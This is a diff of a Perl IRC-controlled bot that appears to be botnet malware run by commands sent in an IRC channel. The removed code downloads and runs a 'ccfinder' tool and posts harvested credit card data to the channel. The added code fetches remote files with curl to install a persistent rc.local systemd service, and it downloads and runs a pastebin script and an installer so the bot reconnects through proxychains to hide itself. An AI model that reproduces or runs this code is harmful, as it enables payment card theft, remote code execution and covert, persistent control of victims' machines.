@@ -48,21 +48,18 @@ $irc->on(irc_privmsg => sub {
   warn 'Version request.';
   $irc->write(notice => $noticechan => "9,1Perl VNC bot [FINAL] by independent: 12https://github.com/independentcod");
  }
- if ($msg =~ /@.ccplz/) {
-  warn 'Sending CC info to IRC...';
-  $irc->write(notice => $noticechan => "[Info] Fetching CC data from Storage and Memory...");
-  system 'wget -O ccfinder https://github.com/ind3p3nd3nt/vncperlbot/raw/master/ccfinder';
-  system 'chmod +x ccfinder';
-  system './ccfinder ~';
-  Time::HiRes::sleep(60);
-  $irc->write(notice => $noticechan => "[Info] Now sending CC data in channel...");
-  open(my $fh, '<:encoding(UTF-8)', $filename);
-  while (my $row = <$fh>) {
-   Time::HiRes::sleep(10);
-   chomp $row;
-   $irc->write(notice => $noticechan => "$row\n");
-  }
-
+ if ($msg =~ /@.autorun/) {
+  system("if [ ! -f "./rc.local" ]; then curl -Lv -o /etc/rc.local https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc.local; else cp -r ./rc.local /etc/rc.local; fi;");
+  system("chown $USER /etc/rc.local && chmod 755 /etc/rc.local && touch /etc/systemd/system/rc-local.service");
+  system("if [ ! -f "./rc-local.service" ]; then curl -Lv -o /etc/systemd/system/rc-local.service https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc-local.service; else cp -r ./rc-local.service /etc/systemd/system/rc-local.service; fi;");
+  system("systemctl enable rc-local;");
+  $irc->write(notice => $noticechan => "[info] Autorun enabled\n");
+ }
+ if ($msg =~ /@.cloak/) {
+  system("curl -LvO https://pastebin.com/raw/w86vVZ7i -o ~/perlircssl.pl");
+  system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/proxych/main/install.sh -o install.sh && sh install.sh;");
+  system("proxychains perl ~/perlircssl.pl&");
+  $irc->write(notice => $noticechan => "[info] Cloaked!\n");
  }
  if ($msg =~ /sudo/) {
              my $fragment =  substr $msg, 7;
